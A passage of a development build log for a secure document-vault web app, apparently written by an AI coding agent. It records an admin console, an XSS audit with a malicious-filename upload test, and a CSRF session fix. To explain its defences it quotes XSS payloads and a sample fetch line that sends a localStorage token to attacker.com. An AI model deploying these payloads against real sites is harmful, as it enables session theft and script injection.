| `client/src/pages/AdminPage.jsx` | Created | Comprehensive Admin Console implementing User Management, Activity Feed, Permission History, and Verify Audit Chain. |
| `client/src/App.jsx` | Modified | Mounted `/admin/:tab` with `ProtectedRoute` restricted to role === 'admin'. |
| `client/src/index.css` | Modified | Added styling for admin tabs, PASS/FAIL banners, user management cards, and filter forms. |
| `backend/src/routes/admin.js` | Modified | Added `GET /` to list registered users and confirmed session termination logic. |
| `backend/src/services/adminService.js` | Modified | Improved `YYYY-MM-DD` end date parsing and verified metadata sanitization. |
| `backend/tests/admin.test.js` | Modified | Added automated integration tests for `GET /admin/users`. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Separation of Duties (Rule 4: Zero Content Access):**
  - In a Zero-Trust architecture, administrative privileges are strictly operational (user lifecycle, role assignment, system health, and cryptographic verification). Admins have no legitimate business need to inspect, preview, or download confidential client documents. Enforcing this constraint at both the API layer (omitting storage paths and download endpoints) and UI layer (plain text metadata rendering with zero `<a>` tags or download buttons) eliminates the risk of insider data exfiltration.
- **Immediate Session Invalidation on Disablement:**
  - When an administrator disables a user account (e.g. following employee offboarding or suspected credential compromise), simply updating a database flag is insufficient if session tokens remain valid in memory or caches. TrustVault sweeps both the Express memory store and the MongoDB `sessions` collection to immediately purge all active sessions associated with the disabled user.
- **Anti-Enumeration via 404 (Rule 3):**
  - Non-admin users who attempt to access `/admin`, `/api/admin/users`, `/api/admin/activity`, or execute `/api/admin/verify-chain` receive `404 Not Found`, never `403 Forbidden`. An attacker cannot even determine whether an administrative endpoint or console exists.
- **Cryptographic Trust via Cryptographic Ledger Verification:**
  - Audit logging is useless if logs can be surreptitiously edited in MongoDB. The "Verify audit chain" button gives administrators instantaneous, verifiable mathematical proof that the audit trail is immutable and untampered.

---

### 4. What Attacks This Design Prevents
1. **Insider Document Exfiltration by Administrators (Rule 4 / CWE-284):**
   - Even a compromised admin account cannot download, preview, or view file contents because neither the admin API nor the admin UI provides download links, storage paths, or file contents.
2. **Administrative Interface Enumeration (Rule 3 / CWE-200):**
   - Unauthenticated attackers and standard users receive generic `404 Not Found` responses on all admin URLs, preventing reconnaissance and targeted privilege escalation attacks.
3. **Ghost Session Persistence on Deactivated Accounts (CWE-613):**
   - Calling `endUserSessions()` upon account disablement immediately destroys all active session records across in-memory and persistent stores, preventing revoked users from executing further requests using existing cookies.
4. **Silent Log Tampering & Evidence Destruction (CWE-353 / Rule 7):**
   - If an attacker gains direct database access and modifies or deletes an audit row, the SHA-256 hash pointer chain breaks. The "Verify audit chain" tool instantly flags the tampering as **FAIL** and pinpoints the exact sequence number where the breach occurred.
5. **Cross-Site Scripting (XSS) via Audit Log Injection (CWE-79):**
   - All user emails, actions, and document names in the activity stream and permission history are rendered strictly as text nodes in React JSX, preventing malicious strings (e.g. `<script>` tags embedded in filenames) from executing in the administrator's browser.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why must the administrator have zero automatic access to file contents and download links, and how is this enforced at both the API and UI layers?
**Answer:**
1. **The Principle of Least Privilege & Separation of Duties:**
   - System administrators are custodians of the infrastructure, not the data owners. Allowing administrators unfettered access to confidential business documents creates a high-value target for spear-phishing and insider threats. By strictly segregating administrative oversight (user provisioning, audit verification) from document content access, TrustVault enforces true Zero-Trust security.
2. **API Layer Enforcement:**
   - The `adminService.getActivityFeed()` function explicitly deletes sensitive properties (`storagePath`, `fileStorageName`, `content`, `downloadUrl`) from all returned records.
   - The `authorize()` policy engine grants content access only to document owners and users with explicit `Permission` records. The `admin` role confers zero bypass privileges in `authorize()`.
3. **UI Layer Enforcement:**
   - In `AdminPage.jsx`, document names are rendered as plain `<span className="doc-metadata-plain">` elements. There are no `<a href="...">` download links, no action buttons that trigger downloads, and no modal dialogs that display file contents.

#### Question 2: How does the "Verify audit chain" feature cryptographically detect tampering or row deletion in the database, and why are SHA-256 hash chains superior to simple timestamps?
**Answer:**
1. **The Vulnerability of Simple Timestamps:**
   - In standard logging systems, logs consist of independent rows with `createdAt` timestamps. If a rogue insider deletes a row or alters a log entry using a database console, there is no mathematical dependency linking adjacent records. The alteration is undetectable unless external off-site logging exists.
2. **Cryptographic Chaining Mechanics:**
   - In TrustVault, each `AuditEvent` record computes its SHA-256 hash using its own fields and the hash of the immediately preceding event:
     $$\text{hash}_n = \text{SHA256}(\text{sequenceNumber}_n + \text{eventType}_n + \text{timestamp}_n + \text{hash}_{n-1})$$
3. **Tamper Detection via `verifyChain()`:**
   - When the administrator clicks "Verify audit chain", the server traverses the ledger sequentially from sequence #1 to the latest event, recalculating each row's expected hash and comparing it to `row.hash` and `nextRow.previousHash`.
   - If a row is modified, its recalculated hash mismatches `row.hash`.
   - If a row is deleted, the subsequent row's `previousHash` fails to match the prior row's hash.
   - The verification fails immediately, returns `pass: false`, and reports the exact `brokenSequence` number.

#### Question 3: When an admin disables a user account, why is merely setting `isActive: false` in the database insufficient, and how does TrustVault achieve immediate session revocation?
**Answer:**
1. **The Session Persistence Gap:**
   - In stateful session architectures, session validation often checks the session store first. If the application caches user status or only queries the database on login, an already-authenticated user can continue making requests until their session cookie expires.
2. **TrustVault's Immediate Dual-Store Invalidation:**
   - When `POST /admin/users/:id/disable` is invoked:
     1. It sets `user.isActive = false` in the `User` collection.
     2. It immediately executes `endUserSessions(req.sessionStore, user._id)`.
     3. In memory, it iterates through all active sessions and deletes any session matching `session.userId === targetId`.
     4. In MongoDB, it executes `sessions.deleteMany({ 'session.userId': targetId })`.
   - If the deactivated user sends another request within milliseconds, the server finds no session, checks credentials, and returns `404 Not Found` per Rule 3.

---

## Build Entry: Client Storage Security Audit & XSS Immunity Verification (`<img src=x onerror=alert(1)>.pdf`)
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Investigated & Built
- **Static Code Audit of `/client` for Web Storage & Raw HTML Injection:**
  - Automated ripgrep search for `localStorage`, `sessionStorage`, and `dangerouslySetInnerHTML` across all files in `client/src/`.
  - **Results:**
    - `localStorage`: **0 runtime usages**. (Present only in comments in `LoginPage.jsx`, `AuthContext.jsx`, and `client.js` documenting that web storage is intentionally forbidden).
    - `sessionStorage`: **0 runtime usages**. (Present only in comments in `AuthContext.jsx` noting state is kept purely in memory).
    - `dangerouslySetInnerHTML`: **0 runtime usages**. (Present only in architecture comments in `DocumentsPage.jsx`, `SearchPage.jsx`, and `Navbar.jsx` documenting strict plain-text rendering).
- **XSS File Upload & Plain-Text Rendering Test Suite (`backend/tests/xss-upload.test.js`):**
  - Built an automated integration test uploading a valid PDF document with the malicious filename: `<img src=x onerror=alert(1)>.pdf`.
  - Verified that:
    1. The upload endpoint accepts the file safely without crashing or sanitizing the `.pdf` extension.
    2. Stored in MongoDB verbatim with `originalFileName: "<img src=x onerror=alert(1)>.pdf"` and `name: "<img src=x onerror=alert(1)>.pdf"`.
    3. `GET /documents` returns the file safely in JSON format.
    4. `GET /documents/:id` returns metadata safely in JSON format.
    5. `GET /admin/activity` records the audit event with the uncorrupted filename stored as plain metadata.
    6. Server-side HTML templates (`adminDashboardHtml.js`) employ `escapeHtml()`, converting `<` and `>` into `&lt;` and `&gt;`.
    7. Client-side React components render the filename strictly via standard JSX `{doc.name}` interpolation, creating a DOM `TextNode` rather than an `HTMLImageElement`.
- **All 13 Backend Test Suites Passing:**
  - 224 total automated tests passing cleanly across the entire repository.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `backend/tests/xss-upload.test.js` | Created | Automated test verifying upload and plain-text output of `<img src=x onerror=alert(1)>.pdf`. |
| `docs/BUILD_LOG.md` | Modified | Appended this security audit and verification log entry. |

---

### 3. Why This Design
- **Complete Elimination of Client-Side Token Exfiltration (Zero `localStorage` / `sessionStorage`):**
  - If a web application stores authentication tokens (JWTs, session IDs, API keys) in `localStorage` or `sessionStorage`, any Cross-Site Scripting (XSS) vulnerability anywhere on the origin allows an attacker to exfiltrate the user's session in a single line of JavaScript (`fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))`).
  - By using `HttpOnly` session cookies combined with in-memory React context, JavaScript cannot access or exfiltrate session credentials even in worst-case injection scenarios.
- **Strict Plain-Text Rendering (Zero `dangerouslySetInnerHTML`):**
  - Document filenames are untrusted user input. If an application interpolates filenames into HTML strings using `dangerouslySetInnerHTML` or `element.innerHTML`, an attacker can achieve Stored XSS simply by uploading a file named `<img src=x onerror=alert(1)>.pdf` or `<svg onload=alert(document.cookie)>`.
  - React's standard `{expression}` syntax creates DOM `TextNode` elements via `document.createTextNode()`, ensuring that angle brackets `<` and `>` are displayed as literal text rather than parsed as HTML tags.

---

### 4. What Attacks This Design Prevents
1. **Stored Cross-Site Scripting via Filenames (CWE-79):**
   - Filenames containing HTML or script payloads (such as `<img src=x onerror=alert(1)>.pdf`) are treated as opaque text strings. The browser renders them as visual characters on screen without executing JavaScript or issuing network requests.
2. **Credential Theft via Web Storage Scraping (CWE-522 / CWE-922):**
   - Because `localStorage` and `sessionStorage` are never used, client-side storage is completely empty of credentials.
3. **DOM-Based XSS in Admin & Audit Logs (CWE-79):**
   - Both the React Admin Console (`AdminPage.jsx`) and the server fallback (`adminDashboardHtml.js`) escape event metadata, ensuring administrators reviewing activity streams are immune to reflected or stored script execution.

---

### 5. Technical Interview Questions & Answers

#### Question 1: How does React's default JSX interpolation `{doc.name}` prevent Cross-Site Scripting (XSS), and under what specific conditions would this protection fail?
**Answer:**
1. **The Automatic Escaping Mechanism:**
   - When React compiles JSX like `<span>{doc.name}</span>`, it calls `React.createElement('span', null, doc.name)`.
   - During DOM reconciliation, React detects that the child is a primitive string and invokes `document.createTextNode(doc.name)`. Text nodes cannot contain executable HTML markup; any `<script>`, `<img>`, or `<iframe>` tags are treated as literal glyphs.
   - When rendered via SSR (`ReactDOMServer.renderToString`), React automatically converts special characters to their HTML entity equivalents: `<` becomes `&lt;`, `>` becomes `&gt;`, `&` becomes `&amp;`, and `"` becomes `&quot;`.
2. **When Protection Fails:**
   - If a developer uses `dangerouslySetInnerHTML={{ __html: doc.name }}`, bypassing React's escaping.
   - If a user input is passed directly to an execution sink like `href={doc.url}` where `doc.url = "javascript:alert(1)"`.
   - If direct DOM manipulation is used outside React (e.g. `ref.current.innerHTML = doc.name`).
   TrustVault strictly forbids all three patterns.

#### Question 2: Why does TrustVault store session state purely in memory on the client rather than caching it in `localStorage` across page reloads?
**Answer:**
1. **The XSS Exfiltration Surface:**
   - Any script running in the browser origin has unrestricted read access to `window.localStorage`. If a third-party dependency in `node_modules` is compromised (supply-chain attack) or a subtle XSS vulnerability exists, all credentials in `localStorage` can be stolen immediately.
2. **TrustVault's In-Memory Pattern:**
   - On the client, `AuthContext` keeps the authenticated `user` object in React memory (`useState`).
   - The actual persistent session credential is an `HttpOnly` cookie managed entirely by the browser network stack.
   - On page refresh, `AuthContext` makes a single background `GET /api/auth/me` request with `credentials: 'include'`. The server validates the `HttpOnly` cookie and returns user metadata.
   - JavaScript never touches or stores the session secret.

---

## Build Entry: Pre-Authentication CSRF SessionID Mismatch Fix
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Fixed
- **Root Cause Analysis of `"Invalid or missing CSRF token"` on `/login`:**
  - With `saveUninitialized: false` in Express session, an unauthenticated client visiting the login page does not have an active session cookie (`trustvault.sid`).
  - Previously, `backend/src/config/csrf.js` evaluated `getSessionIdentifier: (req) => req.session?.userId?.toString() || req.sessionID || 'anonymous'`.
  - When the client fetched `GET /api/auth/csrf-token`, Express assigned an ephemeral in-memory `req.sessionID` (e.g. `sess_A`) that was never persisted or set as a cookie because the session was unmodified.
  - When the client subsequently submitted `POST /api/auth/login`, Express assigned a completely different ephemeral `req.sessionID` (e.g. `sess_B`).
  - `doubleCsrf` attempted to verify the token (signed with `sess_A`) against `sess_B`, failing validation and returning `403 Forbidden` (`"Invalid or missing CSRF token"`).
- **The Solution:**
  1. Updated `getSessionIdentifier` in `backend/src/config/csrf.js` to:
     ```javascript
     getSessionIdentifier: (req) => (req.session && req.session.userId ? req.session.userId.toString() : 'anonymous'),
     ```
     This binds unauthenticated tokens consistently to `'anonymous'`, ensuring that pre-login CSRF tokens evaluate against `'anonymous'` regardless of ephemeral `sessionID` generation.
  2. In `backend/src/routes/auth.js`, the `GET /csrf-token` endpoint touches `req.session.csrfInitiated = true`, establishing a persistent session and issuing the session cookie.
  3. Once authenticated, `req.session.regenerate()` assigns `req.session.userId`, and `login` in `AuthContext.jsx` requests a fresh CSRF token strictly bound to `user._id.toString()`.
- **Live Verification:**
  - Verified via direct HTTP and Vite proxy: `POST /api/auth/login` returns `HTTP 200 OK` and `{ message: "Login successful", user: { ... } }`.


















